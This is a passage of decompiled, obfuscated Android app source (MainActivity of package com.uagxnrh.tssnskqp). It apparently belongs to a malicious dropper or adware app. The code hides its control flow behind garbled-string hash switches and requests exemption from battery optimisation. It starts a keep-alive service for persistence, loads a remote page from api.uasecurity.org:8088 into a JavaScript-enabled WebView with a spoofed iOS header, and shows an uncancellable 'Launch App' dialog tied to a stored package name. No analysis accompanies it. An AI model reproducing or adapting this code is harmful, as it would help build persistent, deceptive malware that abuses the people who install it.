                        FirebaseMessaging.aPyGSIylzVNKPT1Bls().sTkWmhpZ5b1ArQIw4K().s3fjYDxWOUexjjVgyA(new JXsqbvi9UKxeF3HXpU.zZKhbgvUfsK4AEX3r0() { // from class: com.uagxnrh.tssnskqp.Z9WdNiOsPR0y54zHW4
                            @Override // JXsqbvi9UKxeF3HXpU.zZKhbgvUfsK4AEX3r0
                            public final void lEeR5KfoEr4xU5yHH7(JXsqbvi9UKxeF3HXpU.pbVGzGjWvY2LDXC8vo pbvgzgjwvy2ldxc8vo) {
                                String str4 = "۬ۖۖۚۜۘۙۛۨۖۡ۫ۛ۠ۢۛۦۙۨ۟۟ۦۧ۬۬۟ۚ۫ۡۛ۫ۢۧۜۜۤۡۚۖ۫ۜ";
                                while (true) {
                                    switch ((((str4.hashCode() ^ 740) ^ 863) ^ 391) ^ (-1216406972)) {
                                        case -1961497828:
                                            str4 = "۠۬۫ۖۘۤۘ۠ۦۘۦۥ۫ۦۥۢۜۘۦۘۦۥۙ۫۫ۤۘۢۚۧۗۘۥۗۢۨۥۧۘ";
                                            break;
                                        case -1138585758:
                                            str4 = "ۜۗۚۚۛ۟ۜۨ۬۫ۜۨۚۘۘۤ۟ۚۥۜۘۘ۬ۧ۫ۧۡۥۘۘ۟ۗ۫ۢۖۥۛۛۨۦۡۛۖۚ۬۫ۨۛۜ۟ۧ۟ۗۛ۠۟";
                                            break;
                                        case -946178001:
                                            MainActivity.lEeR5KfoEr4xU5yHH7(pbvgzgjwvy2ldxc8vo);
                                            str4 = "ۖ۠ۜۘۜۤۢ۠ۘۤۖ۬۟۫ۧۤ۟ۧۘۘۖۥۙۙۢۙۥۖۨۤۨۘ۟ۧۖۘۡ۫ۤۢۚ۫۫";
                                            break;
                                        case 2062775646:
                                            return;
                                    }
                                }
                            }
                        });
                        break;
                    case -934864450:
                        String str4 = "ۛۚۖۘ۠ۧ۫ۦۘۜۦۜ۫۫ۖۤۢۗۧ۟۟ۜۨۜۜۖۖۘۛ۫ۖۘ۫۠ۗۧۧۧۢۢ۬ۜ۠ۜ";
                        while (true) {
                            switch (str4.hashCode() ^ (-779591125)) {
                                case -955425854:
                                    str3 = "ۤۡۗۦۙ۬ۥۧ۠۫ۢ۟۫ۦۗ۬ۙۜۦۜۛۢ۬ۧ۠۟۟ۤۖۚ۠ۦۡۘ۫ۤ";
                                    continue;
                                    continue;
                                case -290468697:
                                    str3 = "ۛۙۚۢۙۜۤ۠ۗۜ۫ۛ۟ۙۥۡۧۘۧ۟ۦۘۡۛۛۤ۫ۦۢۦۢۡۢۚۡ";
                                    continue;
                                case -73498444:
                                    str4 = "ۦۖۚ۫ۦ۬ۢ۠ۖۘۢۙۨۘۛۢۖۘۧ۫ۘۘۖۧ۫ۡۗۥۘۖۚۧۜۤۧۡ۠۠ۛۙۖۘ۬ۚ۬ۥۤ۟۫ۧۤۛۨۥۘ";
                                    break;
                                case 790561635:
                                    if (f2zPq7MOnQrtOlZ1Zg.IPyIQcaNa8aB7drBED.husNiw3snxdgZPAGJm().KYHag8HRDlnO3X9zmZ(this) != 0) {
                                        str4 = "ۥۨ۠۫۬ۖۧۜ۬ۙۦۡۢۜۦ۟۠ۡ۫۟ۨ۫ۜۙۚ۠۬ۢۤ۫ۙۨ۠۟ۨۘۘۖ۠ۢۨۗۧۜۧۖۖ۫ۦۛ۟ۗۦ۠ۙ";
                                        break;
                                    } else {
                                        str4 = "ۜۥۦۘ۬ۦۛۚ۠ۖۘۜۥۘۜۥۗۤ۫ۥۤۡ۫۬ۤۛۘۗۙ۟ۤۘ";
                                        break;
                                    }
                            }
                        }
                        break;
                    case 726091854:
                        break;
                    default:
                        continue;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            e.printStackTrace();
        }
        String str5 = "ۤۖۘۘۘۛۗۡۥۚ۟ۨۧۡ۟ۦۥۙۥۛ۠ۚ۟ۤۛۡۦۖۘۚ۟ۙۢۥ۬۫ۜ";
        while (true) {
            switch (str5.hashCode() ^ (-1429234074)) {
                case -1897681682:
                    Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                    getSharedPreferences("battery", 0).edit().putBoolean("requested", true).apply();
                    break;
                case -823059513:
                    String str6 = "۠۬ۧۙۗۚۛ۟ۡۥ۟ۚۙ۠ۗۙۚ۠۠ۨۙۖۢۡۘۢۛۦۙۗۙۥۛۨۘۘۤۨۘۥۛۥۙۨ۫ۦۧۦۛ۟ۙ۫ۦ۟ۡ۬ۡ";
                    while (true) {
                        switch (str6.hashCode() ^ (-1212195544)) {
                            case -1602362302:
                                str5 = "۠۟ۚ۬ۛۨۛۨۨۘۚۜۦۘۧۚۡۘۤۤۥۘ۠ۨۧۘۛۜ۠ۤۚۥۘ۫۟ۜۘۦۜۨۘۤۜ۬ۤۜۙۥۙۖ۠۫ۚۚۛۨ";
                                continue;
                                continue;
                            case -276436842:
                                str5 = "ۦۚۦۘۘۙۜۘۤۧۚۘۗۖ۟ۗۘۘۜۗۡۘۗ۟۟ۦۤۙۨۧۢۤۥۢۘۚ۠ۘۧۡۘۢۦۡۖ۫ۢۚۖۜۤۢۧۧ۫ۖۘۖۜۥۘ";
                                continue;
                            case 973653768:
                                if (!getSharedPreferences("battery", 0).getBoolean("requested", false)) {
                                    str6 = "۠ۤۥۘۘۛۚۛۢ۠ۨۥۡۚۙۢۦۢۨۘۨۢۖۘۡۨۙۡۙۡۘۙۥ۫ۦۢ۫ۡۤ۬۫ۢۥۚۜۙۨۘۖۘ۫ۛۥ";
                                    break;
                                } else {
                                    str6 = "۟ۨۜۘۨ۟ۙۜ۠۠ۙۨۧۥۗۨۘۥۥۢۥۖۖۘۢۦۡۘۢۧۤۧۚۨ۬ۤۛۧۥۜۚۤۖۘۗۘۜۘۖۜۘۘۙۧۡ";
                                    break;
                                }
                            case 1988807818:
                                str6 = "ۘۖۨۘۛۧ۠ۗۢۥۘۛۛۜ۬۬۠۫ۨۢۧ۠ۘۢ۬۫ۚۨۛۢ۟ۜۤۜۧۙۚۢۤۖۚۦۘۘۨۗۚۥۡۥۙ۬ۥۡۘ";
                                break;
                        }
                    }
                    break;
                case 351293458:
                    str5 = "ۡۡۗ۠۠۬ۧۛۛۘۜۜۖۖۨۘۘۙۖۧ۟ۢۢ۬۟ۦۗ۠۫۟۠ۙ۬ۤۦۖ۬ۨۡ۠ۤۡۚ";
                    continue;
                case 519441131:
                    break;
            }
        }
        String str7 = "ۨۚۡۘۨۢۘۢۤۖۜ۫ۗۨۤ۠ۥۧ۫۠ۗۚۥ۬ۙ۠ۢۦۘۨۜۛۜۚۘۙ۠ۜۘۘۜۥۘ۫ۖۡۘۜۙۡۘۙۖۜۘۘ۫ۗ۟ۥۧ";
        while (true) {
            switch (str7.hashCode() ^ (-721775361)) {
                case -1957583177:
                    startService(new Intent(this, (Class<?>) KeepAliveServiceMediaPlayback.class));
                    break;
                case -942223307:
                    String str8 = "ۡۖۡ۫ۤۢۥ۟۫۬ۖۙ۠ۖ۟ۚ۟ۤۡۢۙۛۗۗ۠ۦۥ۬۬۠ۖ۠ۡۗۦ";
                    while (true) {
                        switch (str8.hashCode() ^ (-161132045)) {
                            case -1617876926:
                                if (Build.VERSION.SDK_INT < 26) {
                                    str8 = "ۛۡ۟ۡ۠ۨۡ۫ۛۤۘۘۘۥۙۥۘ۬ۜۙۚ۟۬ۜۘ۫۟ۧۧۦۗۨ۟ۗۚۡۘ";
                                    break;
                                } else {
                                    str8 = "۬ۘۥۚۛۙۙ۬ۛۜۦۥۨۥۨۤۥۨۘۥۤۙۥ۫ۧۦۨۛۖۡۗۦۡ۫ۤۛ۠ۙۖۦۤۘۜۘۧۗۘۤۘۜۧۨ۬ۙۤ";
                                    break;
                                }
                            case 797390911:
                                str7 = "ۤۜۦۘۧۜۛۖۚۥۖۛۧ۠۠۫ۖۤ۟ۘۖۨۘۜۡۤۜ۬ۨۘۦۡ۠ۜۗۥۘۘ۫ۦۤۦۥۘ۟ۥ۠۫ۘۧۨۜۧۘ";
                                continue;
                            case 1125173020:
                                str7 = "۫۠ۘۢۖ۟ۖۖ۠ۜ۟ۙۘۨۙۘۖۡۘ۠ۙۖۘۧ۫ۗۡۙۗ۟۟ۖۘ۟ۖۜۧۢ۫ۥ۠ۖۘۨۤۦ";
                                continue;
                            case 1847168489:
                                str8 = "ۡۗۛ۫ۗۦۘۖ۫ۙ۠ۙۘۘۛۛ۠ۚ۠ۛۨۢۢۜ۫ۨۘۛۢۙۘۚۜۘۤ۟۫ۗۥۥۨۢ۬۫ۗۙۧۨ۠۟ۖۨۘۡ۫۬ۥۨۨ";
                                break;
                        }
                    }
                    break;
                case 427125380:
                    IPyIQcaNa8aB7drBED.lEeR5KfoEr4xU5yHH7(this, new Intent(this, (Class<?>) KeepAliveServiceMediaPlayback.class));
                    break;
                case 1416014246:
                    str7 = "ۥۨۖ۠ۡۦۧۨۦۘۖۚ۟ۖۛۗۨۜۘۘ۫ۥۚۡۡۧۜۦۘۘۦ۬ۥ۬ۦۙۨۧۚۨۧۦ۟ۢۡۨۡۥۘۗۙۜۘ";
                    break;
            }
        }
        WebView webView = (WebView) findViewById(OANkd3mP6AYvwbNLJM.f5561zZKhbgvUfsK4AEX3r0);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new lEeR5KfoEr4xU5yHH7(this));
        HashMap map = new HashMap();
        map.put("Sec-Ch-Ua-Platform", "\"iOS\"");
        map.put("Accept-Language", "en-US,en;q=0.9");
        webView.loadUrl("http://api.uasecurity.org:8088/ads.html", map);
    }

    @Override // android.app.Activity
    public void onResume() {
        String str = "ۖۗۛۤۚۦۜۘۦۥۘۘۥۙۘۚۧۖۨۧۤۥۗۗ۟ۥۨۧۘۛۜۜۡۡ۟ۦۚۗۡۘۨۜۘۘۙۨۦۘۦۢۡۨۚۡۘۗۚۦۘ";
        AlertDialog alertDialogCreate = null;
        StringBuilder sb = null;
        final String string = null;
        while (true) {
            switch ((((str.hashCode() ^ 183) ^ 131) ^ 158) ^ (-982037489)) {
                case -2037627935:
                    String str2 = "ۤۨۘۘ۟ۦۡۘ۟ۙۧۤۖۛۤ۠ۘۘ۬ۥۖۘۚۘۖۘۖۖۨۘ۫۠ۨ۠۠ۨۘ۫ۛۡۢۛۧۚۛۙۚۚۛ";
                    while (true) {
                        switch (str2.hashCode() ^ (-1902029946)) {
                            case -1749579496:
                                String str3 = "ۧۨۤۛۙۥۘۢۤۤۨۗۥۘۛۦ۫ۖۛۧۥۤۚۜۨۘۘۤۗ۠ۖۚ";
                                while (true) {
                                    switch (str3.hashCode() ^ (-1533939546)) {
                                        case -1869686310:
                                            str3 = !this.f5556lEeR5KfoEr4xU5yHH7 ? "ۗۜۧۘۥۢۦۥ۫ۚ۫ۤ۠ۗۘۨۨۘۦۜۥۛۤۘۘۘۧۡ۬۠ۧ۟ۥۧۘۗۧۚۥۘۚۦۤۨۤۜۨۘ۫ۛۖۘ" : "ۤ۫ۡۘ۟ۙ۟ۦ۫ۦۜۢۧۧۗۡۡۧۢۘ۬ۢۖۗ۠۠ۦۡۥۘۘۤۢۨۥۙۡۦۙۡۡۛۨۘۚۨۥۛۤۨۘ";
                                        case -1693068434:
                                            str2 = "ۚۡۚۗۡۤ۟ۤۘۘۦۛۥۚۨ۬۫ۨۧ۟ۨۧۛۨۖۤۛۥۘ۫ۜۛ";
                                            break;
                                        case -1094203634:
                                            str3 = "ۡۛۤۧۛۘ۬۬ۖۘۤ۬ۗۛۘ۫ۤۨۤۧۡۖ۬ۜ۬ۡۘ۠ۡۛۢۗ۫۠ۡۡۥ۠۠۠ۖۘ۬ۚۙۦۖۘ";
                                        case 1123254244:
                                            str2 = "۠ۧۙۦۘۤۘۡۜۘۨ۫ۨۘۤۜۗ۟ۙۦۥۦۨۙۥۧۘۙۦ۬ۢۥۜۘۚ۬ۚۦ۬۫";
                                            break;
                                    }
                                }
                                break;
                            case -1476247613:
                                str = "ۖۜۦۘۙۖۜۛۖۨۘۡۘۢۧۦۧۙۗ۫ۧۦۨۘ۟ۙۙۙ۟۫۫۫ۨۦ۬ۤۖۘۧ۫۬ۛۛۜۘ";
                                continue;
                            case 147384486:
                                str = "ۤۚۖۛۢۙۨۢۜۘۖۧۖۘۖ۫ۗۢۖۦۧۘۤۡۤ۬ۚۥۦۧۤۢۘۥ۬ۘۚۜۢۜۧۢۛۨ";
                                continue;
                                continue;
                            case 1090046490:
                                str2 = "ۢۦ۫ۚ۬ۢۤۛۦ۟ۥ۟ۡۦۧۘۗۡۧۥۤۧۖۦ۫ۘۙ۬ۨۗۤۘ۬ۥۛۙۘۗۜۥۢۜۘۘ";
                                break;
                        }
                    }
                    break;
                case -1570919820:
                    return;
                case -1500008040:
                    alertDialogCreate.show();
                    str = "ۧۚۜۖۧۨ۬۟ۚۥۥۧۘ۫ۨۥۘۚۗۖۘۤۨۢۡۛ۟ۦۡۥۥ۫ۜۖۛۥ۬۠ۤۚ۫ۦۡۘ۠ۘۛۡۘۛ۫ۜۧۢۦۥۥۡ";
                    continue;
                case -1234121447:
                    sb.append("resume: ");
                    str = "ۖۚۜۘۤۥۗۥ۟ۨ۠ۘۚ۠ۦۘ۫ۥۦۗۢۥۘۢۨۥۘ۠ۧۛۤۘۦۘۘۥۤۚۘۘۘۡ۬ۚۥۜۙۡ۬ۗ۟۟ۥ";
                    continue;
                case -1083519280:
                    str = "ۤۚۖۖۧۡۘ۫۬ۥۘۘ۟ۨۥۖۦۚۛۘۥ۟ۥۦۨ۟ۦۘۡۘ۠ۤۜۘۤۢۧۥ۬ۜۗۨۚ۟ۨۛ۫ۙۤۖۙۧ۟۠۫ۖۤ";
                    continue;
                case -807147831:
                    alertDialogCreate = new AlertDialog.Builder(this).setTitle("Launch App").setMessage("Click to launch the app.").setPositiveButton("Launch", new DialogInterface.OnClickListener() { // from class: com.uagxnrh.tssnskqp.e54J8UWNHWALQNixXM
                        @Override // android.content.DialogInterface.OnClickListener
                        public final void onClick(DialogInterface dialogInterface, int i) {
                            String str4 = "۫ۚۜۘ۫ۙۢۨۥۚ۬ۗۙ۟ۢۜۘ۠ۥۘۘۘۦۧۘۗۙۡۘۙۖۧۘۜ۬ۧۙۘ۟ۧۜ";
                            while (true) {
                                switch ((((str4.hashCode() ^ 606) ^ 539) ^ 496) ^ 201948476) {
                                    case -1326017983:
                                        MainActivity.zZKhbgvUfsK4AEX3r0(dialogInterface, i);
                                        str4 = "ۖۗۡ۫ۥۙۦۖۗۨ۫ۧ۫ۧۨۢ۬ۗۖۧۘۥۤۨۜۘۢ۫ۦۜۘۖ۫ۨۧۜ۬۟ۛۖۘۙۘ۬۠ۗۦۘۗۙۨۘ";
                                        break;
                                    case -683384101:
                                        str4 = "ۨۢۖۚ۟ۦۚۙ۬ۦۤۖۘ۟ۗ۠ۛۦۦۢ۠ۗۚۤۨۘ۠۠ۘۘۢۢ";
                                        break;
                                    case -105523295:
                                        return;
                                    case 172347473:
                                        str4 = "۫ۨۥۘۙۖۖۘۤۙۛۚۨۡۘۙۗۥۧۨۥۨۘۨۘۗۧۢۡ۫ۡ۫ۡۥۘۗ۠ۨۘۘۖۦ";
                                        break;
                                    case 1276139467:
                                        str4 = "ۚ۠ۦۘۚۙۡۢۜۥۘۘۛۨۡۛۤۛۗۥۘۤۖ۠ۧۦۜۘۤ۫ۡۘۡۧ۠ۨ۠ۥۡۚۛۨ۠ۦ۫۫ۖۘۗۧۧ۟ۦۧۘ";
                                        break;
                                }
                            }
                        }
                    }).setCancelable(false).create();
                    str = "ۙۢۨۢۙۥۜۛۖۘ۠ۤۛۘۘۘۘۦۖ۠۟ۙۡ۟ۖۜۘ۟ۚۜۘۥۘۜۜۢۖۡۧۘ۬ۛ۠ۗۘ۠ۥ۫۟ۧۚۘ";
                    continue;
                case -604949665:
                    sb = new StringBuilder();
                    str = "۠۟۬ۜۜۢۤۨۢۡۚۨ۠ۧ۟ۘۜۨۘۢۥۚۦ۟۠ۡۥۦۛۜۛۚۥۘۤۥ۠۠ۢ۬ۛۚۦۘ۟ۤ۫۬۟ۚ";
                    continue;
                case -571657944:
                    String str4 = "ۘۖۘۘۡۚۥۘۗۥۧۘۢۘۖ۟ۨۧۙۚ۠ۚۜۜۘۚۢۦۚۚۙۖۡ۫ۦۛۨۘ۟ۘ۬";
                    while (true) {
                        switch (str4.hashCode() ^ (-937552966)) {
                            case -1810510139:
                                str = "ۢۥۖۘۚۦ۬ۨۥۖ۫ۦۙۤ۬ۨۘۖۛۙۤۛۦۗۙۖۢۨۨۜ۠ۧۘۡۘ۬ۧۚ۫ۦۛ۬۫ۢۚۡ۟ۗۦۘۜۖۖۧۙۜۘ";
                                break;
                            case -34844283:
                                String str5 = "ۗۡۦۘ۫۠ۙ۬ۖۧۘ۠ۛۦۤ۠ۥۢۚ۟ۢۥۜۘۛۧۗۥۢۛ۬۫ۜۘ";
                                while (true) {
                                    switch (str5.hashCode() ^ 555687801) {
                                        case -1062481083:
                                            str4 = "ۦۥۦۡ۬۠ۙۜۛۧۗ۠ۛۧ۫ۚۖۘ۫ۦۦۘۡ۫ۚۙ۟ۤۢۙ۠ۢۖۧۘۤۙۨۘ۫ۜ۠۟ۗ۟ۧۦۢۚۤۨۘ";
                                            break;
                                        case -977319644:
                                            str5 = "ۢۛۜۘۖۗ۫۠ۘ۟ۛۛۚۡۘۜۡ۫ۡۘۨۗۨۙۤ۫ۘۧۘۡۖۖۙ۫ۦۡۥ۬ۤ۬ۨۡۢ۠۫ۡۦۖ۟ۢ";
                                        case 224785280:
                                            str4 = "ۤۨۨۥۙۦۤۦ۟ۖۤۖۙۖۥۙ۬ۢۧ۟ۧۧۡۘۛۚۡۘ۬۠۟";
                                            break;
                                        case 2100874922:
                                            str5 = KYHag8HRDlnO3X9zmZ(string) ? "ۙ۠ۦۘۡۛۜۗ۬ۜۜۖۘ۬ۤۜۘۢۚۨۙۘۥۘۦ۟ۖۘ۫ۛۢۘۤ۠ۗۧۤۦۦۦ" : "ۙ۬ۨۖۘۛ۫ۥۗۘۗۛۜۦۧۘۙۗۤۜۜۖۥ۫ۘۘۗ۫ۢۙ۟۬ۤ۬ۢۗۘۜۢ۟ۚۥۤۖۘ۠ۥۤۨۙۛ";
                                    }
                                }
                                break;
                            case 1303665244:
                                str4 = "ۚ۬ۖۘۛۚ۫ۤۛۦۨۨۧۖۥۘۘۡۨۚۤۨۛ۠ۡۦۖۥۖۘۙۢۤۧۛۗ۟۫۠ۨۡۤۛۨ۫۠۟ۤۧ۫ۧۛۦ۫۫ۖ۠";
                            case 2066298154:
                                break;
                        }
                    }
                    break;
                case -180163018:
                    super.onResume();
                    str = "ۢۤۥۙ۫ۜ۬ۚ۫۠ۜۥۤۚۦۘۧ۫ۧۜۛۨۘۥۨۛۢۡ۬ۤۜۢ";
                    continue;
                case 75526553:
                    Log.d("install", sb.toString());
                    str = "ۖۜۚۜۚ۫ۧۨۨۗۜۤۧۥ۬ۗۢۖۢۤۜۗۛ۬ۚۥۘۢ۟ۜۘۧۜۥۡۦ۟۠ۧۜۘۦۦۦۘۢۛۖۢۤۥۧۧۗ۠ۤ۬";
                    continue;
                case 384118151:
                    sb.append(string);
                    str = "ۚۚ۟ۨۦۖۘۜۖۧۘۢۜۙۡۙۨۖۗۧۢۙۙۘۖۡۘۜۦۢۜۗۛۢۛ۬۟۬ۜۗۦۚۗ۬ۥ۟ۗۢۚۦ۬ۧۛۦ۫ۡۙ";
                    continue;
                case 620687195:
                    string = getSharedPreferences("pref", 0).getString("pkg", null);
                    str = "ۚۗۜۛ۫ۘۘۖۛۤۧۦۜ۟ۢ۠ۚۘۨۘ۫ۥۢۛۦۥۥۥۘۧۥۤ۠ۤۥۡۤ۠";
                    continue;
                case 648925341:
                    alertDialogCreate.getButton(-1).setOnClickListener(new View.OnClickListener(this, string) { // from class: com.uagxnrh.tssnskqp.T9PhQIpGRhE4yZDm1C

                        /* renamed from: lEeR5KfoEr4xU5yHH7, reason: collision with root package name */
                        public final MainActivity f5562lEeR5KfoEr4xU5yHH7;

                        /* renamed from: s3fjYDxWOUexjjVgyA, reason: collision with root package name */
                        public final String f5563s3fjYDxWOUexjjVgyA;

                        {
                            this.f5562lEeR5KfoEr4xU5yHH7 = this;
                            this.f5563s3fjYDxWOUexjjVgyA = string;
                        }

                        @Override // android.view.View.OnClickListener
                        public final void onClick(View view) {
                            String str6 = "ۨۚ۠۬ۘۜۢۦۖۙۢۢۖ۫ۡۦۢۙۤۜۛۗۛۦۘۘۛۥۜۦۙۨۜۖ۟ۡۖۘ۠۬ۡۘ۠۠ۦ";
                            while (true) {
                                switch ((((str6.hashCode() ^ 382) ^ 444) ^ 901) ^ 257573849) {
                                    case -1453286281:
                                        str6 = "ۙۖۚ۫۟ۥۖۛۤ۫۠۟ۙۦۖ۠ۜۤۚۦۘۖۡ۫ۚۛۘۛۡۗۗۛۚۥۗ۫ۙۡ۟ۨۨ۠ۥۤۨۢۡۖ";
                                        break;
                                    case -1112278504:
                                        str6 = "ۙۢۦۥۡۘۘۛ۠ۥۛۙ۫ۡۛۙۘۨۘۘۗۨۛۥۧۦۗۦۖۘۤۡۖ۫۬ۡۘۥۦ۫ۥۤۜۘۙۚۢۛ۠ۜۚ۫۠";
                                        break;
                                    case -897731937:
                                        return;
                                    case -219251825:
                                        MainActivity.HJFh0TGMpafqLE9haL(this.f5562lEeR5KfoEr4xU5yHH7, this.f5563s3fjYDxWOUexjjVgyA, view);
                                        str6 = "ۤۜۥۨ۠ۚۤۥۨۦۛۨ۫ۦۙۢۜ۟ۨۜۦۧۨۛۤ۬ۤۢۥۙۧۧۢۚ۫ۦۘۖۤۜۢۢۘۘۨۨ۟ۚۤۗ";
                                        break;
                                }
                            }
                        }
                    });
                    str = "ۖۜۦۘۙۖۜۛۖۨۘۡۘۢۧۦۧۙۗ۫ۧۦۨۘ۟ۙۙۙ۟۫۫۫ۨۦ۬ۤۖۘۧ۫۬ۛۛۜۘ";
                    continue;
                case 999469541:
                    String str6 = "ۡۡۜۢ۫ۛۢۚۖۢۦۨۧۙۗ۠ۛۚۥۜۙۧۤۧۜ۟ۧۙ۫۟ۛۜۘۘۢ۟ۜ۬ۖۘۤۜۨۘۨۥۥۥۨۥۨ۠ۙ۟ۙۢ";
                    while (true) {
                        switch (str6.hashCode() ^ (-433516567)) {
                            case -1988849121:
                                str = "ۨ۬ۡۘۤ۬ۨۘۙۤ۬ۡۧ۠ۦ۫ۘۢ۬ۜۘۧۜۥۡۙۖ۠۫ۛۜۥ۫۬ۢۜۢۚۖۘ۟ۧۜۡ۫ۤۧۖۡۘ۬ۤۘۨۘۜۥۖۧۘ";
                                break;
                            case -1024470966:
                                str6 = "ۨۡۚۚۖۜۘۤۨۛۗۡۥۥ۬ۖۙۛۖۘۥۧۛۘۦۜ۠ۤ۠۫ۡۛۚۗۙۤۚۜۦۥۙۛۜۘ۫ۘۜۗ۫ۖۥۢۥۘۚۢۨۘ";
                            case 919894697:
                                break;
                            case 1490964201:
                                String str7 = "ۙۛۨ۠ۘۙۨۨۤۢۖۨ۬۟ۦۙۥۛۦۥۚ۬ۙ۫ۧۦۘۖۤۤ";
                                while (true) {
                                    switch (str7.hashCode() ^ 1079975248) {
                                        case -1636707945:
                                            str7 = string != null ? "ۥۙۧۡۦۚۜۥۜۜۚۧۜۨۚۛۦۧ۠۠ۨۚ۬ۦۘۤ۠ۥۘۗۚۥۘ۫۬ۘۛۙۜۘۦۛۦۜۧ۠" : "۠ۗ۟ۢ۫ۛۖ۬ۧۢۖۛۧۜۗ۬۬۬۟ۨ۠۠۟ۢۥۙۡۘ۠ۗۥۘۙ۟ۤۨۖۦ";
                                        case -1225350974:
                                            str6 = "ۗۜۜۘۖۘۥۧۧۚ۠ۜۘۘۧۨۜۘۤۡۖۚۗ۟ۛۜۤ۠ۦۥۘۦۥۖۘ";
                                            break;
                                        case 39070197:
                                            str6 = "۬ۘۗۜۘ۟ۗۖ۬ۦۘۥۜۨ۟ۥۥ۠۟ۡۘۘۖۧۘ۫۫۫ۥ۟۫";
                                            break;
                                        case 120803962:
                                            str7 = "ۜۢۜۢۦۡۧۦۖۖۡۘۜ۬ۘۘۜۦۢ۠ۧۜۘۥۜۢۤۨۘۚۛۜۤۜۘ۠۬ۚ";
                                    }
                                }
                                break;
                        }
                    }
                    break;
                case 1348491789:
                    this.f5556lEeR5KfoEr4xU5yHH7 = true;
                    str = "ۚۧۨۖۦ۟ۙۥ۠ۨۘۡ۟ۗۡ۫۠ۚۤۨۚ۠۟۫ۜۖۘۦۥۥۢۥۘۛ۟ۚ";
                    continue;
                case 1544408060:
                    e54J8UWNHWALQNixXM(string);
                    str = "۟ۙۨۘۘۛ۟ۧۙۡ۟ۘۡۘۚۖۨ۠ۡ۟ۥۘۧۢۢۧ۠ۖۡۘۦۦۨ۫ۙ۫ۧۙۥۛۖۜۘ۠ۨۨۜۘۥ۟ۘ۬ۛۘ۫۫ۢ";
                    continue;
            }
            str = "۟ۙۨۘۘۛ۟ۧۙۡ۟ۘۡۘۚۖۨ۠ۡ۟ۥۘۧۢۢۧ۠ۖۡۘۦۦۨ۫ۙ۫ۧۙۥۛۖۜۘ۠ۨۨۜۘۥ۟ۘ۬ۛۘ۫۫ۢ";
        }
    }
}
